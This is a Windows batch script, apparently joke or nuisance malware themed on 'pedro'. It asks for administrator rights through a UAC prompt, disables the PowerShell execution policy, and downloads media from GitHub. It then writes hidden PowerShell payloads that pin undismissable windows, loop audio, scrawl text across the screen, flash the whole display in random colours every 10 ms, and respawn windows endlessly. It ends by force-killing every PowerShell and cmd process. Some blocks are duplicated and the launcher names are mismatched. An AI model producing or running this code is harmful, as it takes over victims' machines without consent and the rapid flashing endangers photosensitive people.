@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/pedro/blob/main/pedro.gif?raw=true" -outfile "pedro.gif"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/pedro/raw/main/pedro.mp3" -outfile "pedro.mp3"

echo Add-Type -AssemblyName System.Windows.Forms																						> pedro.ps1
echo Add-Type -TypeDefinition @^"                                                                                                       >> pedro.ps1
echo using System;                                                                                                                      >> pedro.ps1
echo using System.Runtime.InteropServices;                                                                                              >> pedro.ps1
echo using System.Drawing;                                                                                                              >> pedro.ps1
echo public class Win32 {                                                                                                               >> pedro.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedro.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                >> pedro.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedro.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                               >> pedro.ps1
echo     [DllImport("winmm.dll")]                                                                                                       >> pedro.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                    >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedro.ps1
echo public struct MONITORINFO {                                                                                                        >> pedro.ps1
echo     public int cbSize;                                                                                                             >> pedro.ps1
echo     public RECT rcMonitor;                                                                                                         >> pedro.ps1
echo     public RECT rcWork;                                                                                                            >> pedro.ps1
echo     public int dwFlags;                                                                                                            >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedro.ps1
echo public struct RECT {                                                                                                               >> pedro.ps1
echo     public int Left;                                                                                                               >> pedro.ps1
echo     public int Top;                                                                                                                >> pedro.ps1
echo     public int Right;                                                                                                              >> pedro.ps1
echo     public int Bottom;                                                                                                             >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo ^"@                                                                                                                                >> pedro.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                       >> pedro.ps1
echo $form.Text = "Rotating Form"                                                                                                       >> pedro.ps1
echo $form.Size = New-Object Drawing.Size(500, 400)                                                                                     >> pedro.ps1
echo $form.ControlBox = $false                                                                                                          >> pedro.ps1
echo $form.Topmost = $true                                                                                                              >> pedro.ps1
echo $form.TopLevel = $true                                                                                                             >> pedro.ps1
echo $form.StartPosition = "Manual"                                                                                                     >> pedro.ps1
echo $form.ShowInTaskbar = $false                                                                                                       >> pedro.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                            >> pedro.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                           >> pedro.ps1
echo $pictureBox.Size = $form.Size                                                                                                      >> pedro.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                             >> pedro.ps1
echo $form.Controls.Add($pictureBox)                                                                                                    >> pedro.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\pedro.gif"                                                                                  >> pedro.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                  >> pedro.ps1
echo $pictureBox.Image = $gif                                                                                                           >> pedro.ps1
echo $radiusX = 300                                                                                                                     >> pedro.ps1
echo $radiusY = 300                                                                                                                     >> pedro.ps1
echo function GetEllipticalLocation($centerX, $centerY, $radiusX, $radiusY, [ref]$angle) {                                              >> pedro.ps1
echo     $x = [int]($centerX + $radiusX * [Math]::Cos($angle.Value))                                                                    >> pedro.ps1
echo     $y = [int]($centerY + $radiusY * [Math]::Sin($angle.Value))                                                                    >> pedro.ps1
echo     $angle.Value += 0.025                                                                                                          >> pedro.ps1
echo     return [Drawing.Point]::new($x, $y)                                                                                            >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo $angle = 0.0                                                                                                                       >> pedro.ps1
echo $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                           >> pedro.ps1
echo $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                         >> pedro.ps1
echo $centerX = $screenWidth / 2.6                                                                                                      >> pedro.ps1
echo $centerY = $screenHeight / 3                                                                                                       >> pedro.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                     >> pedro.ps1
echo $timer.Interval = 60                                                                                                               >> pedro.ps1
echo $timer.Add_Tick({                                                                                                                  >> pedro.ps1
echo     $form.Location = GetEllipticalLocation $centerX $centerY $radiusX $radiusY ([ref]$angle)                                       >> pedro.ps1
echo })                                                                                                                                 >> pedro.ps1
echo $timer.Start()                                                                                                                     >> pedro.ps1
echo $form.ShowDialog()                                                                                                                 >> pedro.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                      >> pedro.ps1

echo Add-Type -AssemblyName System.Windows.Forms																						> pedro.ps1
echo Add-Type -TypeDefinition @^"                                                                                                       >> pedro.ps1
echo using System;                                                                                                                      >> pedro.ps1
echo using System.Runtime.InteropServices;                                                                                              >> pedro.ps1
echo using System.Drawing;                                                                                                              >> pedro.ps1
echo public class Win32 {                                                                                                               >> pedro.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedro.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                >> pedro.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedro.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                               >> pedro.ps1
echo     [DllImport("winmm.dll")]                                                                                                       >> pedro.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                    >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedro.ps1
echo public struct MONITORINFO {                                                                                                        >> pedro.ps1
echo     public int cbSize;                                                                                                             >> pedro.ps1
echo     public RECT rcMonitor;                                                                                                         >> pedro.ps1
echo     public RECT rcWork;                                                                                                            >> pedro.ps1
echo     public int dwFlags;                                                                                                            >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedro.ps1
echo public struct RECT {                                                                                                               >> pedro.ps1
echo     public int Left;                                                                                                               >> pedro.ps1
echo     public int Top;                                                                                                                >> pedro.ps1
echo     public int Right;                                                                                                              >> pedro.ps1
echo     public int Bottom;                                                                                                             >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo ^"@                                                                                                                                >> pedro.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                       >> pedro.ps1
echo $form.Text = "Rotating Form"                                                                                                       >> pedro.ps1
echo $form.Size = New-Object Drawing.Size(500, 400)                                                                                     >> pedro.ps1
echo $form.ControlBox = $false                                                                                                          >> pedro.ps1
echo $form.Topmost = $true                                                                                                              >> pedro.ps1
echo $form.TopLevel = $true                                                                                                             >> pedro.ps1
echo $form.StartPosition = "Manual"                                                                                                     >> pedro.ps1
echo $form.ShowInTaskbar = $false                                                                                                       >> pedro.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                            >> pedro.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                           >> pedro.ps1
echo $pictureBox.Size = $form.Size                                                                                                      >> pedro.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                             >> pedro.ps1
echo $form.Controls.Add($pictureBox)                                                                                                    >> pedro.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\pedro.gif"                                                                                  >> pedro.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                  >> pedro.ps1
echo $pictureBox.Image = $gif                                                                                                           >> pedro.ps1
echo $radiusX = 300                                                                                                                     >> pedro.ps1
echo $radiusY = 300                                                                                                                     >> pedro.ps1
echo function GetEllipticalLocation($centerX, $centerY, $radiusX, $radiusY, [ref]$angle) {                                              >> pedro.ps1
echo     $x = [int]($centerX + $radiusX * [Math]::Cos($angle.Value))                                                                    >> pedro.ps1
echo     $y = [int]($centerY + $radiusY * [Math]::Sin($angle.Value))                                                                    >> pedro.ps1
echo     $angle.Value += 0.025                                                                                                          >> pedro.ps1
echo     return [Drawing.Point]::new($x, $y)                                                                                            >> pedro.ps1
echo }                                                                                                                                  >> pedro.ps1
echo $angle = 0.0                                                                                                                       >> pedro.ps1
echo $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                           >> pedro.ps1
echo $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                         >> pedro.ps1
echo $centerX = $screenWidth / 2.6                                                                                                      >> pedro.ps1
echo $centerY = $screenHeight / 3                                                                                                       >> pedro.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                     >> pedro.ps1
echo $timer.Interval = 60                                                                                                               >> pedro.ps1
echo $timer.Add_Tick({                                                                                                                  >> pedro.ps1
echo     $form.Location = GetEllipticalLocation $centerX $centerY $radiusX $radiusY ([ref]$angle)                                       >> pedro.ps1
echo })                                                                                                                                 >> pedro.ps1
echo $timer.Start()                                                                                                                     >> pedro.ps1
echo $form.ShowDialog()                                                                                                                 >> pedro.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                      >> pedro.ps1

echo Add-Type -AssemblyName System.Windows.Forms																						> pedronosound.ps1
echo Add-Type -TypeDefinition @^"                                                                                                       >> pedronosound.ps1
echo using System;                                                                                                                      >> pedronosound.ps1
echo using System.Runtime.InteropServices;                                                                                              >> pedronosound.ps1
echo using System.Drawing;                                                                                                              >> pedronosound.ps1
echo public class Win32 {                                                                                                               >> pedronosound.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedronosound.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                >> pedronosound.ps1
echo     [DllImport("user32.dll")]                                                                                                      >> pedronosound.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                               >> pedronosound.ps1
echo     [DllImport("winmm.dll")]                                                                                                       >> pedronosound.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                    >> pedronosound.ps1
echo }                                                                                                                                  >> pedronosound.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedronosound.ps1
echo public struct MONITORINFO {                                                                                                        >> pedronosound.ps1
echo     public int cbSize;                                                                                                             >> pedronosound.ps1
echo     public RECT rcMonitor;                                                                                                         >> pedronosound.ps1
echo     public RECT rcWork;                                                                                                            >> pedronosound.ps1
echo     public int dwFlags;                                                                                                            >> pedronosound.ps1
echo }                                                                                                                                  >> pedronosound.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                              >> pedronosound.ps1
echo public struct RECT {                                                                                                               >> pedronosound.ps1
echo     public int Left;                                                                                                               >> pedronosound.ps1
echo     public int Top;                                                                                                                >> pedronosound.ps1
echo     public int Right;                                                                                                              >> pedronosound.ps1
echo     public int Bottom;                                                                                                             >> pedronosound.ps1
echo }                                                                                                                                  >> pedronosound.ps1
echo ^"@                                                                                                                                >> pedronosound.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                       >> pedronosound.ps1
echo $form.Text = "Rotating Form"                                                                                                       >> pedronosound.ps1
echo $form.Size = New-Object Drawing.Size(500, 400)                                                                                     >> pedronosound.ps1
echo $form.ControlBox = $false                                                                                                          >> pedronosound.ps1
echo $form.Topmost = $true                                                                                                              >> pedronosound.ps1
echo $form.TopLevel = $true                                                                                                             >> pedronosound.ps1
echo $form.StartPosition = "Manual"                                                                                                     >> pedronosound.ps1
echo $form.ShowInTaskbar = $false                                                                                                       >> pedronosound.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                            >> pedronosound.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                           >> pedronosound.ps1
echo $pictureBox.Size = $form.Size                                                                                                      >> pedronosound.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                             >> pedronosound.ps1
echo $form.Controls.Add($pictureBox)                                                                                                    >> pedronosound.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\pedro.gif"                                                                                  >> pedronosound.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                  >> pedronosound.ps1
echo $pictureBox.Image = $gif                                                                                                           >> pedronosound.ps1
echo $radiusX = 300                                                                                                                     >> pedronosound.ps1
echo $radiusY = 300                                                                                                                     >> pedronosound.ps1
echo $mp3Path = Join-Path $env:APPDATA "ren\pedro.mp3"                                                                                  >> pedronosound.ps1
echo [Win32]::mciSendString("open `"${mp3Path}`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)                                   >> pedronosound.ps1
echo [Win32]::mciSendString("play mp3 repeat", $null, 0, [IntPtr]::Zero)                                                                >> pedronosound.ps1
echo function GetEllipticalLocation($centerX, $centerY, $radiusX, $radiusY, [ref]$angle) {                                              >> pedronosound.ps1
echo     $x = [int]($centerX + $radiusX * [Math]::Cos($angle.Value))                                                                    >> pedronosound.ps1
echo     $y = [int]($centerY + $radiusY * [Math]::Sin($angle.Value))                                                                    >> pedronosound.ps1
echo     $angle.Value += 0.025                                                                                                          >> pedronosound.ps1
echo     return [Drawing.Point]::new($x, $y)                                                                                            >> pedronosound.ps1
echo }                                                                                                                                  >> pedronosound.ps1
echo $angle = 0.0                                                                                                                       >> pedronosound.ps1
echo $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                           >> pedronosound.ps1
echo $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                         >> pedronosound.ps1
echo $centerX = $screenWidth / 2.6                                                                                                      >> pedronosound.ps1
echo $centerY = $screenHeight / 3                                                                                                       >> pedronosound.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                     >> pedronosound.ps1
echo $timer.Interval = 60                                                                                                               >> pedronosound.ps1
echo $timer.Add_Tick({                                                                                                                  >> pedronosound.ps1
echo     $form.Location = GetEllipticalLocation $centerX $centerY $radiusX $radiusY ([ref]$angle)                                       >> pedronosound.ps1
echo })                                                                                                                                 >> pedronosound.ps1
echo $timer.Start()                                                                                                                     >> pedronosound.ps1
echo $form.ShowDialog()                                                                                                                 >> pedronosound.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                      >> pedronosound.ps1


echo Add-Type -TypeDefinition @^"																															> rainbow.ps1																															
echo using System;                                                                                                                                          >> rainbow.ps1
echo using System.Runtime.InteropServices;                                                                                                                  >> rainbow.ps1
echo public class PatBlt3                                                                                                                                   >> rainbow.ps1
echo {                                                                                                                                                      >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                          >> rainbow.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                    >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                          >> rainbow.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                       >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                           >> rainbow.ps1
echo     public static extern IntPtr CreateSolidBrush(uint color);                                                                                          >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                           >> rainbow.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                                                                              >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                           >> rainbow.ps1
echo     public static extern int PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);                                          >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                           >> rainbow.ps1
echo     public static extern int DeleteObject(IntPtr hObject);                                                                                             >> rainbow.ps1
echo     public static void RunPatBlt3()                                                                                                                    >> rainbow.ps1
echo     {                                                                                                                                                  >> rainbow.ps1
echo         Random rand = new Random();                                                                                                                    >> rainbow.ps1
echo         while (true)                                                                                                                                   >> rainbow.ps1
echo         {                                                                                                                                              >> rainbow.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                           >> rainbow.ps1
echo             int w = (int)GetSystemMetrics(0);                                                                                                          >> rainbow.ps1
echo             int h = (int)GetSystemMetrics(1);                                                                                                          >> rainbow.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(rand.Next() %% 255 ^| (rand.Next() %% 255) ^<^< 8 ^| (rand.Next() %% 255) ^<^< 16));                         >> rainbow.ps1
echo             SelectObject(hdc, brush);                                                                                                                  >> rainbow.ps1
echo             PatBlt(hdc, 0, 0, w, h, 0x005A0049);                                                                                                       >> rainbow.ps1
echo             DeleteObject(brush);                                                                                                                       >> rainbow.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                               >> rainbow.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                         >> rainbow.ps1
echo         }                                                                                                                                              >> rainbow.ps1
echo     }                                                                                                                                                  >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                          >> rainbow.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                             >> rainbow.ps1
echo }                                                                                                                                                      >> rainbow.ps1
echo ^"@                                                                                                                                                    >> rainbow.ps1
echo [PatBlt3]::RunPatBlt3()                                                                                                                                >> rainbow.ps1

echo Add-Type -AssemblyName System.Windows.Forms									> eyes.ps1
echo Add-Type -AssemblyName System.Drawing                                          >> eyes.ps1
echo $imagePath = Join-Path $env:appdata 'ren\pedro.gif'                             >> eyes.ps1
echo $form = New-Object System.Windows.Forms.Form                                   >> eyes.ps1
echo $form.ControlBox = $false                                                      >> eyes.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None           >> eyes.ps1
echo $form.TransparencyKey = $form.BackColor                                        >> eyes.ps1
echo $form.ShowInTaskbar = $false                                                   >> eyes.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                       >> eyes.ps1
echo $pictureBox.ImageLocation = $imagePath                                         >> eyes.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom         >> eyes.ps1
echo $form.Controls.Add($pictureBox)                                                >> eyes.ps1
echo $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width       >> eyes.ps1
echo $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height     >> eyes.ps1
echo $formWidth = $form.Width                                                      >> eyes.ps1
echo $formHeight = $form.Height                                                       >> eyes.ps1
echo $form.StartPosition = 'Manual'                                                 >> eyes.ps1
echo $form.Left = Get-Random -Minimum 0 -Maximum ($screenWidth - $formWidth)        >> eyes.ps1
echo $form.Top = Get-Random -Minimum 0 -Maximum ($screenHeight - $formHeight)       >> eyes.ps1
echo $form.Add_Closed({                                                             >> eyes.ps1
echo     $form.Dispose()                                                            >> eyes.ps1
echo })                                                                             >> eyes.ps1
echo [Windows.Forms.Application]::Run($form)                                        >> eyes.ps1

echo Add-Type -TypeDefinition @^"																			> lose.ps1
echo using System;                                                                                          >> lose.ps1
echo using System.Runtime.InteropServices;                                                                  >> lose.ps1
echo public class LoserPrinter                                                                              >> lose.ps1
echo {                                                                                                      >> lose.ps1
echo     [DllImport("user32.dll")]                                                                          >> lose.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                    >> lose.ps1
echo     [DllImport("user32.dll")]                                                                          >> lose.ps1
echo     public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);                             >> lose.ps1
echo     [DllImport("user32.dll")]                                                                          >> lose.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                    >> lose.ps1
echo     [DllImport("user32.dll")]                                                                          >> lose.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                       >> lose.ps1
echo     [DllImport("gdi32.dll")]                                                                           >> lose.ps1
echo     public static extern IntPtr CreateSolidBrush(int crColor);                                         >> lose.ps1
echo     [DllImport("gdi32.dll")]                                                                           >> lose.ps1
echo     public static extern int SelectClipRgn(IntPtr hdc, IntPtr hrgn);                                   >> lose.ps1
echo     [DllImport("gdi32.dll")]                                                                           >> lose.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                              >> lose.ps1
echo     [DllImport("gdi32.dll")]                                                                           >> lose.ps1
echo     public static extern int TextOut(IntPtr hdc, int x, int y, string lpString, int nCount);           >> lose.ps1
echo     [DllImport("gdi32.dll")]                                                                           >> lose.ps1
echo     public static extern int DeleteObject(IntPtr hObject);                                             >> lose.ps1
echo     [DllImport("kernel32.dll")]                                                                        >> lose.ps1
echo     public static extern void Sleep(uint dwMilliseconds);                                              >> lose.ps1
echo     public static void PrintLoser()                                                                    >> lose.ps1
echo     {                                                                                                  >> lose.ps1
echo         Random rand = new Random();                                                                    >> lose.ps1
echo         RECT rect;                                                                                     >> lose.ps1
echo         GetWindowRect(GetDesktopWindow(), out rect);                                                   >> lose.ps1
echo         int w = rect.right - rect.left;                                                                >> lose.ps1
echo         int h = rect.bottom - rect.top;                                                                >> lose.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                               >> lose.ps1
echo         while (true)                                                                                   >> lose.ps1
echo         {                                                                                              >> lose.ps1
echo             int x = rand.Next() %% w;                                                                   >> lose.ps1
echo             int y = rand.Next() %% h;                                                                   >> lose.ps1
echo             int r = rand.Next() %% 256;                                                                 >> lose.ps1
echo             int g = rand.Next() %% 256;                                                                 >> lose.ps1
echo             int b = rand.Next() %% 256;                                                                 >> lose.ps1
echo             IntPtr brush = CreateSolidBrush((r ^<^< 16) ^| (g ^<^< 8) ^| b);                                 >> lose.ps1
echo             SelectClipRgn(hdc, IntPtr.Zero);                                                           >> lose.ps1
echo             SelectObject(hdc, brush);                                                                  >> lose.ps1
echo             TextOut(hdc, x, y, "PEDRO~~", 5);                                                            >> lose.ps1
echo             DeleteObject(brush);                                                                       >> lose.ps1
echo             Sleep(70);                                                                                 >> lose.ps1
echo         }                                                                                              >> lose.ps1
echo     }                                                                                                  >> lose.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                              >> lose.ps1
echo     public struct RECT                                                                                 >> lose.ps1
echo     {                                                                                                  >> lose.ps1
echo         public int left;                                                                               >> lose.ps1
echo         public int top;                                                                                >> lose.ps1
echo         public int right;                                                                              >> lose.ps1
echo         public int bottom;                                                                             >> lose.ps1
echo     }                                                                                                  >> lose.ps1
echo }                                                                                                      >> lose.ps1
echo ^"@                                                                                                    >> lose.ps1
echo [LoserPrinter]::PrintLoser()                                                                           >> lose.ps1

echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > pedro.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\pedronosound.ps1'" >> pedro.bat

echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > pedronosound.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\pedro.ps1'" >> pedronosound.bat

echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > rainbow.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\rainbow.ps1'" >> rainbow.bat

echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > pedromini.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\eyes.ps1'" >> pedromini.bat

echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > pedrotext.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\lose.ps1'" >> pedrotext.bat


echo powershell -windowstyle hidden -command ^"Start-Process cmd -WindowStyle Hidden -ArgumentList ^'/c > pedromini2.bat
echo :a >> pedromini2.bat
echo timeout 5 >> pedromini2.bat
echo start /min pedromini.bat >> pedromini2.bat
echo goto a >> pedromini2.bat

start /min pedro.bat
timeout 7
start /min pedronosound.bat
timeout 7
start /min pedronosound.bat
timeout 25
start /min pedromini2.bat
timeout 25
start /min pedrotext.bat
timeout 30
start /min rainbow.bat
timeout 30
taskkill /f /im powershell.exe & taskkill /f /im cmd.exe
exit